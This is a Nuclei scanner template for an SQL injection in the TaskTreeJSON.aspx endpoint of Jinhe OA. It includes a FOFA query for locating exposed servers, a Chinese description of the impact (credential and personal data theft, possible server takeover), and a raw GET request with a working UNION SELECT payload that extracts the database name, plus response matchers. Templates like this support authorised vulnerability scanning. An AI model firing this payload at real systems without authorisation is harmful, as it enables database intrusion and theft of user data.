id: jinheOA-TaskTreeJSON_aspx-sql

info:
  name: 金和OA TaskTreeJSON.aspx SQL注入漏洞
  author: Superhero
  severity: high
  description: |-
    fofa: app="金和网络-金和OA" || body="/jc6/platform/sys/login"
    金和OA TaskTreeJSON.aspx 接口存在SQL注入漏洞，攻击者除了可以利用 SQL 注入漏洞获取数据库中的信息（例如，管理员后台密码,站点的用户个人信息）之外，甚至在高权限的情况可向服务器中写入木马，进一步获取服务器系统权限。
  reference:
    - https://mp.weixin.qq.com/s/sPiSxjFfqqyzm2gtNCHV-g
  tags: sql injection

http:
  - raw:
      - |
        GET /C6/JHSoft.Web.DailyTaskManage/TaskTreeJSON.aspx/?id=1%27+union+all+select+null%2C%28select+db_name()%29%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull--+ HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:132.0) Gecko/20100101 Firefox/132.0
    matchers-condition: and
    matchers:
      - type: word
        part: body
        words:
          - '||C6'
          - 'permissions'
          - 'value'
        condition: and
      - type: status
        status: 
          - 200